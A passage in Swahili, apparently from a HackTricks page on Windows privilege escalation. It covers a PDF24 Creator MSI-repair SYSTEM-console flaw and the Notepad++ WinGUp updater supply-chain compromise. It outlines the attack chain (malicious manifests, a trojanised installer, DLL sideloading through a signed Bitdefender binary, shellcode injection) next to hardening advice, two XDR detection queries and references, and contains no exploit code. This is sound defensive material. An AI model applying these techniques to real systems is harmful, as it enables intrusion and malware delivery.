PDF24 Creator 11.15.1 inaonyesha hatari tofauti ya MSI-repair: custom action yake ya kusakinisha printer inaweza kuanzisha console inayoonekana yenye haki za SYSTEM wakati wa repair. Vendor alibadilisha MSI installer katika 11.15.2 ili kushughulikia tabia hii. Toleo la zamani la bidhaa ni kidokezo tu cha triage. Kagua package ya MSI iliyosajiliwa au inayoweza kufikiwa, kama mtumiaji huyu anaweza kuanzisha repair, kama custom action iliyo hatarini na ucheleweshaji wa log file vipo, na kama desktop inayoingiliana inaweza kuonyesha console. Ucheleweshaji ulioripotiwa ulitumia oplock kwenye `faxPrnInst.log`; uwezo wa kawaida wa kuandika faili si sharti pekee la ufikiaji. Shell isiyoingiliana, package isiyoweza kufikiwa, au installer iliyofanyiwa patch inaweza kuvunja mnyororo huu. Tatizo hili halitegemei `AlwaysInstallElevated` na ni tofauti na kubadilisha script ya muda yenye jina linalotabirika.

---
## Utekaji wa supply-chain wa mbali kupitia uthibitishaji dhaifu wa updater (WinGUp / Notepad++)

Kati ya Juni 2025 na Desemba 2025, washambuliaji waliodhibiti miundombinu ya hosting ya mchakato wa update wa Notepad++ waliwasilisha manifests hasidi kwa walengwa waliochaguliwa pekee. Updaters za zamani zilizotumia WinGUp hazikuthibitisha kikamilifu uhalisi wa update, hivyo jibu hasidi la XML lingeweza kuelekeza clients kwenye URL zinazodhibitiwa na washambuliaji. Kwa kuwa client ilikubali maudhui ya HTTPS bila kulazimisha uthibitishaji wa certificate chain inayoaminika pamoja na PE signature halali kwenye installer iliyopakuliwa, waathiriwa walipakua na kutekeleza `update.exe` ya NSIS iliyowekewa trojan.<sup>[[12]](#references)[[13]](#references)</sup>

Mtiririko wa kiutendaji (hauhitaji local exploit):
1. **Kuingilia miundombinu**: vunja usalama wa CDN/hosting na ujibu ukaguzi wa update kwa metadata ya mshambuliaji inayoelekeza kwenye URL hasidi ya upakuaji.
2. **NSIS iliyowekewa trojan**: installer hupakua/kutekeleza payload na kutumia minyororo miwili ya utekelezaji:
   - **Bring-your-own signed binary + sideload**: jumuisha `BluetoothService.exe` iliyosainiwa na Bitdefender na uweke `log.dll` hasidi kwenye search path yake. Binary iliyosainiwa inapoendeshwa, Windows hupakia `log.dll` kwa sideload; DLL hii hufungua usimbaji na kupakia kwa reflectively Chrysalis backdoor (iliyolindwa na Warbird + API hashing ili kuzuia utambuzi wa static).
   - **Scripted shellcode injection**: NSIS hutekeleza Lua script iliyocompiliwa inayotumia Win32 APIs (kwa mfano, `EnumWindowStationsW`) kuingiza shellcode na kuandaa Cobalt Strike Beacon.<sup>[[12]](#references)</sup>

Mambo ya kuzingatia kuhusu hardening/detection kwa updater yoyote:
- Hakikisha **certificate + signature verification** ya installer iliyopakuliwa (pin vendor signer, kataa CN/chain zisizolingana) na usaini update manifest yenyewe (kwa mfano, XMLDSig). Zuia redirects zinazodhibitiwa na manifest isipokuwa zimethibitishwa.
- Chukulia **BYO signed binary sideloading** kama sehemu ya kuanzia detection baada ya upakuaji: toa tahadhari signed vendor EXE inapopakia jina la DLL kutoka nje ya canonical install path yake (kwa mfano, Bitdefender inapopakia `log.dll` kutoka Temp/Downloads), na updater inapoweka/kuendesha installers kutoka temp zenye signatures zisizo za vendor.
- Fuatilia **artifacts mahususi za malware** zilizoonekana kwenye mnyororo huu (zinafaa kama pivots za jumla): mutex `Global\Jdhfv_1.0.1`, maandishi yasiyo ya kawaida ya `gup.exe` kwenye `%TEMP%`, na hatua za Lua-driven shellcode injection.
- Notepad++ ilijibu kwa kuimarisha WinGUp katika v8.8.9 na matoleo ya baadaye: XML inayorejeshwa sasa imesainiwa (XMLDSig), na builds mpya zaidi hulazimisha certificate + signature verification ya installer iliyopakuliwa badala ya kuamini transport pekee.<sup>[[13]](#references)</sup>

<details>
<summary>Cortex XDR XQL – EXE iliyosainiwa na Bitdefender inayosideload <code>log.dll</code> (T1574.001)</summary>

```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```

</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> ikizindua kisakinishi kisicho cha Notepad++</summary>

```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```

</details>

Mitindo hii inatumika kwa updater yoyote inayokubali manifests zisizosainiwa au isiyothibitisha signers wa installer—kuteka nyara mtandao + installer hasidi + sideloading iliyosainiwa kwa cheti chako mwenyewe huwezesha remote code execution kwa kisingizio cha masasisho “yanayoaminika”.

---
## References
- [1] [Ushauri – Netskope Client for Windows – Local Privilege Escalation kupitia Seva Rogue (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [2] [Ushauri wa Usalama wa Netskope NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [3] [NachoVPN – plugin ya Netskope](https://github.com/AmberWolfCyber/NachoVPN)
- [4] [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [5] [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [6] [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre na Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [7] [0xdf – HTB: NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [8] [SEC Consult – Local Privilege Escalation kupitia faili zinazoweza kuandikwa katika Checkmk Agent](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
- [9] [Checkmk Werk #16361 – Privilege escalation katika Windows agent](https://checkmk.com/werk/16361)
- [10] [PoCs za sensepost/bloatware-pwn](https://github.com/sensepost/bloatware-pwn)
- [11] [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [12] [Unit 42 – Wavamizi wa Taifa Wanatumia Mnyororo wa Ugavi wa Notepad++](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [13] [Notepad++ – taarifa ya sasisho kuhusu tukio la miundombinu iliyotekwa nyara](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [14] [AmberWolf – Kupita marekebisho ya CVE-2025-0309 katika Netskope Client for Windows](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [15] [Atredis – Kugundua hitilafu za Privilege Escalation katika Lenovo Vantage](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)
- [16] [Quarkslab – MyReport Updater: kutoka gRPC hadi SYSTEM](https://blog.quarkslab.com/myreport-updater-from-grpc-to-system.html)
{{#include ../../banners/hacktricks-training.md}}
